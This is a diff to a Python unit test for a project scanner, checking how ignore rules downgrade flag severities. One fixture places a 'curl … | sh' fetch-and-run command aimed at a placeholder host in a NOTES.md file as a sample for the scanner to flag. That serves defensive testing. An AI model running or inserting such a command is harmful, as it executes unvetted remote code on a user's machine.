@@ -84,7 +84,7 @@ class Verdict(unittest.TestCase):
                         ".scanignore": "vendor/" + chr(10)})
         plain = scan.screen(root, honour_ignore=False)
         self.assertEqual(flag(plain, "copyleft-in-permissive-tree")["severity"], "critical")
-        card = scan.screen(root)
+        card = scan.screen(root, honour_ignore=True)
         lowered = next(f for f in card["flags"] if f["id"] == "copyleft-in-permissive-tree")
         self.assertEqual((lowered["severity"], lowered["original_severity"]), ("info", "critical"))
         out = verdict.make(card, json.dumps(card).encode())
@@ -108,7 +108,7 @@ class Verdict(unittest.TestCase):
                  ("warning", {"NOTES.md": "curl https://host.invalid/install | sh" + chr(10)}, "NOTES.md", "PATCH"))
         for original, files, ignore, expected in cases:
             root = project({**MINIMAL, **files, ".scanignore": ignore + chr(10)})
-            card = scan.screen(root)
+            card = scan.screen(root, honour_ignore=True)
             self.assertEqual({f["severity"] for f in card["flags"] if f.get("excluded")}, {"info"}, original)
             self.assertEqual({f["original_severity"] for f in card["flags"] if f.get("excluded")}, {original})
             out = verdict.make(card, json.dumps(card).encode())
